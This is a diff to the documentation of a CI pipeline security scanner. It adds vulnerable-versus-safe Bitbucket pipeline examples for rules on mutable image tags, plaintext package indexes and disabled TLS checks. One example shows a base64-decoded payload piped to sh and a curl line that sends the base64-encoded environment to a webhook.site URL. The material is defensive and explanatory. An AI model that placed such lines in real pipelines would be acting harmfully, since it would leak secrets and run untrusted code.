@@ -1195,6 +1195,33 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``atlassian/aws-s3-deploy:1`` resolves to
+# whatever the publisher's latest 1.x image is at job
+# start. A publisher takeover (compromised Atlassian
+# Marketplace account, leaked token) repoints the tag
+# silently; every consumer's pipeline executes the new
+# image on the next run.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1
+            variables: { ... }
+
+# Safe: pin to an exact version (``X.Y.Z``). Renovate /
+# Dependabot's bitbucket-pipe ecosystem bumps these in
+# reviewable PRs.
+pipelines:
+  default:
+    - step:
+        script:
+          - pipe: atlassian/aws-s3-deploy:1.7.0
+            variables: { ... }
+```
+
 **Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }
@@ -1247,6 +1274,31 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification on the
+# named host. A network attacker swaps wheels in flight.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pip install --index-url http://internal-pypi.example.com/simple \
+              --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA installed
+# in the image's trust store.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim@sha256:abc123...
+        script:
+          - pip install --index-url https://internal-pypi.example.com/simple \
+              --require-hashes -r requirements.txt
+```
+
 **Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }
@@ -1297,6 +1349,34 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` / ``NODE_TLS_
+# REJECT_UNAUTHORIZED=0``) disables certificate
+# verification for the duration. A network attacker MITMs
+# the registry and ships substituted tarballs.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - npm config set strict-ssl false
+          - npm install
+
+# Safe: install the missing CA into the image's trust
+# store; keep strict-ssl on.
+pipelines:
+  default:
+    - step:
+        image: node:20@sha256:abc123...
+        script:
+          - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+          - update-ca-certificates
+          - npm install
+```
+
 **Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }
@@ -1322,6 +1402,32 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to a third-party webhook, or runs a
+# known miner binary. A malicious PR (or a compromised
+# maintainer) lands the payload in the pipeline file;
+# every subsequent build executes it.
+pipelines:
+  default:
+    - step:
+        script:
+          - echo Z2g6Li4uIA== | base64 -d | sh
+          - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# No obfuscated execution, no exfil POSTs, no
+# base64 -d | sh pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+pipelines:
+  default:
+    - step:
+        script:
+          - make build
+```
+
 **Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).
 
 ### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }
@@ -1345,6 +1451,31 @@ Severity LOW because the failure mode is downstream correlation friction rather 
 **Known false positives.**
 
 - Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: python:3.12-slim`` is a mutable
+# tag. Docker Hub's image team rebuilds it on every
+# Python point release; a publisher takeover ships code
+# into every Bitbucket pipeline that uses the tag.
+pipelines:
+  default:
+    - step:
+        image: python:3.12-slim
+        script:
+          - pytest
+
+# Safe: pin to the content-addressable digest. The pin
+# documents which version the digest corresponded to so
+# bumps stay reviewable.
+pipelines:
+  default:
+    - step:
+        image: python@sha256:abc123...  # python:3.12.1-slim
+        script:
+          - pytest
+```
 
 **Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).
 
